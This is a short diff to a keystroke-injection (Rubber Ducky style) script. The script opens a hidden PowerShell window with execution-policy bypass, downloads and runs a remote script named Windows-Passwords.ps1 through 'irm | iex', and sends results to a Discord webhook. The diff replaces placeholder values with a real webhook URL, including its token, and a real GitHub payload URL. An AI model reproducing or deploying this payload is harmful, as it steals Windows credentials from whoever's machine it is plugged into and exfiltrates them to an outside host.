@@ -16,10 +16,9 @@ GUI r
 DELAY 250
 STRING powershell -w h -ep bypass $discord='
 
-REM REQUIRED - Provide Discord Webhook - https://discordapp.com/api/webhooks/<webhook_id>/<token>
-DEFINE DISCORD example.com
+REM Provide Discord Webhook - https://discordapp.com/api/webhooks/<webhook_id>/<token>
+DEFINE DISCORD https://discord.com/api/webhooks/1447492875704205362/VyqK99hc7pwqsloWyBulkjPktt7zdS6QqDLeaUyovN4pFrWMsBD3fP2ue0ubyBYMNGms
 STRING DISCORD
-
-REM Reply example.com with YOUR LINK. The Payload should be Windows-Passwords.ps1
-DEFINE PAYLOAD example.com
+REM Provide payload
+DEFINE PAYLOAD https://raw.githubusercontent.com/javirufo-ies/hacking/c561c68e0ad541a6dd6e653ef835d86a029adf9b/Windows-Passwords.ps1
 STRINGLN ';irm PAYLOAD | iex
